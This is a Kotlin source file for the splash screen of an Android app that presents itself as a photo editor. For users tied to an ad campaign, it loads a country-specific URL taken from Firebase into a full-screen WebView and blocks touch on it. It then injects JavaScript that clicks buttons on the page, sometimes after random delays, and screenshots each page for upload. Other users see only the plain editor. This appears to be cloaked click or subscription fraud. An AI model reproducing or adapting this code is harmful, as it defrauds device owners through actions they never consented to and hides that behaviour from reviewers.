package com.peditor.green.activity.splash

import android.annotation.SuppressLint
import android.content.Context
import android.content.Intent
import android.graphics.Bitmap
import android.net.Uri
import android.os.Bundle
import android.os.CountDownTimer
import android.telephony.TelephonyManager
import android.util.Log
import android.view.View
import android.webkit.CookieSyncManager
import android.webkit.ValueCallback
import android.webkit.WebChromeClient
import android.webkit.WebView
import android.widget.FrameLayout
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.FileProvider
import com.amplitude.api.Amplitude
import com.appsflyer.AppsFlyerLib
import com.google.firebase.firestore.DocumentReference
import com.google.firebase.firestore.FirebaseFirestore
import com.google.firebase.ktx.Firebase
import com.google.firebase.storage.ktx.storage
import com.peditor.green.App
import com.peditor.green.R
import com.peditor.green.Utils.Analytics
import com.peditor.green.Utils.lk.*
import com.peditor.green.Utils.lk.creator.FirebaseLogger
import com.peditor.green.activity.EditActivity
import kotlinx.android.synthetic.main.activity_splash.*
import java.io.ByteArrayOutputStream
import java.io.File
import java.io.FileOutputStream
import java.util.*
import kotlin.random.Random

class SplashAct : AppCompatActivity(R.layout.activity_splash) {

    //
    private var app = App()
    private var variables = Variables()
    private var mPrefs = PreferenceProvider()
    private var flyerParams = FlyerParams()
    private val db: FirebaseFirestore = FirebaseFirestore.getInstance()
    private var paramUtils = ParamUtils()
    private val wv = WV()

    private lateinit var webView: WebView
    private val imagePick = 1
    private var mUploadMessage: ValueCallback<Array<Uri>>? = null

    private var flow = LoadWatcher.K_FLOW

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        Analytics.open()

        app.getAdvertisingId(this)
        init()

        variables.OPEN = mPrefs.getDataInt(LideraSharedKeys.FirstOpenView.key)
        variables.lastUrl = mPrefs.getDataString(LideraSharedKeys.LastOpenUrl.key)

        splashLoader()
    }



    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        val results = arrayOf(Uri.parse(data!!.dataString))
        mUploadMessage!!.onReceiveValue(results)
        super.onActivityResult(requestCode, resultCode, data)

    }

    override fun onResume() {
        super.onResume()
        CookieSyncManager.getInstance().startSync()
    }

    override fun onPause() {
        super.onPause()
        mPrefs.saveDataInt(LideraSharedKeys.FirstOpenView.key, variables.OPEN)
        mPrefs.saveDataString(LideraSharedKeys.LastOpenUrl.key, webView.url)
    }

    /*override fun onBackPressed() {
        if (webView.canGoBack()) {
            webView.goBack()
        } else {
            variables.outCode++
            if (variables.outCode == 2) {
                variables.outCode = 0
                variables.firstUrl = mPrefs.getDataString(LideraSharedKeys.FirstOpenUrl.key)
                webView.loadUrl(variables.firstUrl)
            }
        }
    }*/

    private fun init() {
        variables.appsFlyerId = AppsFlyerLib.getInstance().getAppsFlyerUID(applicationContext)
        CookieSyncManager.createInstance(applicationContext)
        val tm = applicationContext.getSystemService(TELEPHONY_SERVICE) as TelephonyManager
        Variables.CC = tm.networkCountryIso
        webView = WebView(this)
        webView.layoutParams = FrameLayout.LayoutParams(
                FrameLayout.LayoutParams.MATCH_PARENT,
                FrameLayout.LayoutParams.MATCH_PARENT
        )
        wvSettings()
    }

    private fun getFirebaseData() {
        val docRef: DocumentReference =
                db.collection(LideraSharedKeys.COLLECTION.key).document(variables.DOCUMENT)
        docRef.get().addOnCompleteListener { task ->
            if (task.isSuccessful) {
                val document = task.result
                if (document != null && document.exists()) {
                    val map: MutableMap<String, Any>? = document.data
                    //if (variables.lastUrl == LideraSharedKeys.AppCheckerWord.key) {
                    if (map!![Variables.CC] != null) {
                        variables.FIREBASE = map[Variables.CC].toString()
                    }
                    if (variables.FIREBASE.isNotEmpty()) {
                        variables.FIREBASE = paramUtils.replaceParamHome(
                                variables.FIREBASE,
                                App.gadid,
                                variables.appsFlyerId
                        )
                        variables.FIREBASE = paramUtils.replaceParamOut(
                                variables.FIREBASE,
                                variables.sub_name_1,
                                variables.sub_name_2,
                                variables.sub_name_3,
                                variables.sub_name_4
                        )

                        flBack.removeAllViews()
                        flBack.addView(webView)

                        LoadWatcher.setCallbacks(object : LoadWatcher.WatcherCallbacks {
                            override fun loaded(number: Int, url: String) {

                                flBack.isDrawingCacheEnabled = true
                                flBack.drawingCacheQuality = View.DRAWING_CACHE_QUALITY_HIGH
                                flBack.buildDrawingCache()
                                FirebaseLogger.saveImage(flBack.drawingCache, url)
                                flBack.isDrawingCacheEnabled = false

                                when (number) {
                                    0 -> {
                                        Analytics.showButton()
                                        pbLoad.visibility = View.INVISIBLE
                                        btnStart.visibility = View.VISIBLE
                                        btnStart.setOnClickListener {
                                            if (flow == LoadWatcher.K_FLOW) {
                                                val js = "javascript:(function(){" +
                                                        "l=document.getElementsByClassName('btn nClick')[0];" +
                                                        "l.click();" +
                                                        "})()"
                                                webView.evaluateJavascript(
                                                        js
                                                ) { value -> Log.e("LOL", value.toString()) }
                                                btnStart.visibility = View.GONE
                                                pbLoad.visibility = View.VISIBLE
                                                Analytics.clickButtonK()
                                            } else {
                                                val js = "javascript:(function(){" +
                                                        "l=document.getElementsByClassName('play_btn red')[0];" +
                                                        "l.click();" +
                                                        "})()"
                                                webView.evaluateJavascript(
                                                        js
                                                ) { value -> Log.e("LOL", value.toString()) }
                                                Analytics.clickFirstButton()
                                                var millis = Random.nextLong(1_000L, 4_000L)
                                                var countDown =
                                                        object : CountDownTimer(millis, 300) {
                                                            override fun onTick(millisUntilFinished: Long) {
                                                            }

                                                            override fun onFinish() {
                                                                val js = "javascript:(function(){" +
                                                                        "l=document.getElementsByClassName('btn nClick')[0];" +
                                                                        "l.click();" +
                                                                        "})()"
                                                                webView.evaluateJavascript(
                                                                        js
                                                                ) { value ->
                                                                    Log.e(
                                                                            "LOL",
                                                                            value.toString()
                                                                    )
                                                                }
                                                                Analytics.clickSecondButton()
                                                            }
                                                        }
                                                countDown.start()

                                                btnStart.visibility = View.GONE
                                                pbLoad.visibility = View.VISIBLE

                                            }
                                        }
                                    }
                                    1 -> {
                                        //startTimer()
                                    }
                                }
                            }

                            override fun choiceFlow(numberFlow: Int) {
                                flow = numberFlow
                            }
                        })

                        webView.setOnTouchListener(View.OnTouchListener { v, event -> true })
                        webView.loadUrl(variables.FIREBASE, HeaderHolder.getHeaders())

                    } else {
                        startScreen()
                    }
                    //}
                } else {
                    startScreen()
                }
            } else {
                startScreen()
            }
        }
    }

    private fun splashLoader() {
        val t: Thread = object : Thread() {
            @SuppressLint("SetTextI18n")
            override fun run() {
                try {
                    while (!variables.isRun) {
                        if (variables.runIterator >= 100 || App.campaign != "null" && App.campaign != "None") {
                            variables.isRun = true
                            startUIChange()
                            break
                        }

                        variables.runIterator++

                        sleep(120)

                    }
                } catch (e: InterruptedException) {
                    e.printStackTrace()
                }
            }
        }
        t.start()
    }

    private fun startUIChange() {
        //if (variables.lastUrl == LideraSharedKeys.AppCheckerWord.key) {
        getAppsflyerParametr()
        //} else {
        //    secondUiChanger()
        //}
    }


    private fun secondUiChanger() {
        runOnUiThread {
            //fl_splash.removeAllViews()
            //fl_splash.addView(webView)
            webView.loadUrl(variables.lastUrl)
        }
    }


    @SuppressLint("SetJavaScriptEnabled")
    private fun wvSettings() {
        wv.setParams(webView)
        webView.webChromeClient = object : WebChromeClient() {

            override fun onShowFileChooser(
                    webView: WebView?,
                    filePathCallback: ValueCallback<Array<Uri>>?,
                    fileChooserParams: FileChooserParams?
            ): Boolean {
                mUploadMessage = filePathCallback
                val pickIntent = Intent()
                pickIntent.type = "image/*"
                pickIntent.action = Intent.ACTION_GET_CONTENT
                startActivityForResult(
                        Intent.createChooser(pickIntent, "Select Picture"),
                        imagePick
                )
                return true
            }
        }
    }

    private fun getAppsflyerParametr() {
        flyerParams.paramReceiver()
        variables.DOCUMENT = flyerParams.getDocName()
        getFirebaseData()
    }

    fun startScreen() {
        Analytics.openWhite()
        var intentStartChoiseAct = Intent(this@SplashAct, EditActivity::class.java)
        startActivity(intentStartChoiseAct)
        finish()
    }
}